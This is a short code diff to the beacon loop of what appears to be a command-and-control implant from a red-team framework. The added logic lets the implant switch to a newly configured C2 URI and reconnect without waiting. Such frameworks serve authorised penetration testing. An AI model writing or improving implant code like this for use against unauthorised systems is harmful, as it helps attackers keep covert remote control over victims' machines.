@@ -152,6 +152,13 @@ func beaconStartup() {
 		log.Printf("Next beacon = %v", beacon)
 		// {{end}}
 		if beacon != nil {
+			// skip stale beacons when c2-uri has changed
+			if c2 := transports.GetC2URI(); c2 != "" && c2 != beacon.ActiveC2 {
+				// {{if .Config.Debug}}
+				log.Printf("[beacon] skipping stale beacon for %s, c2-uri is %s", beacon.ActiveC2, c2)
+				// {{end}}
+				continue
+			}
 			err := beaconMainLoop(beacon)
 			if err != nil {
 				connectionErrors++
@@ -159,6 +166,10 @@ func beaconStartup() {
 					return
 				}
 			}
+		}
+		// skip 1m reconnect sleep if c2-uri just changed
+		if c2 := transports.GetC2URI(); c2 != "" && (beacon == nil || c2 != beacon.ActiveC2) {
+			continue
 		}
 		reconnect := transports.GetReconnectInterval()
 		// {{if .Config.Debug}}
@@ -286,6 +297,14 @@ func beaconMainLoop(beacon *transports.Beacon) error {
 		case <-time.After(duration):
 		case <-shortCircuit:
 			// Short circuit current duration with no error
+		}
+
+		// check if reconfig used to set a new C2-URI 
+		if c2 := transports.GetC2URI(); c2 != "" && c2 != beacon.ActiveC2 {
+			// {{if .Config.Debug}}
+			log.Printf("[beacon] C2 URI changed to %s, reconnecting...", c2)
+			// {{end}}
+			return nil
 		}
 	}
 	return nil
